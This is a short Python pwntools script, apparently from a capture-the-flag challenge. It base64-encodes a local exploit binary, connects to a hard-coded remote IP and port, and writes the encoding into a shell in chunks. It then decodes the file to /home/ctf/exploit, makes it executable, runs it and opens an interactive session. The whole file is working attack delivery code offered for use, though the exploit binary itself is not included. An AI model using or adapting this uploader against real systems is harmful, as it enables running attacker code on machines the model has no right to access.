from pwn import *
import base64
#context.log_level = "debug"

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("101.245.64.169", 10001)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil("$")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /home/ctf/b64_exp")
        count += 1
        log.info("count: " + str(count))

    # for i in range(count):
    #     p.recvuntil("$")

    p.sendline("cat /home/ctf/b64_exp | base64 -d > /home/ctf/exploit")
    p.sendline("chmod +x /home/ctf/exploit")
    p.sendline("/home/ctf/exploit ")
    break

p.interactive()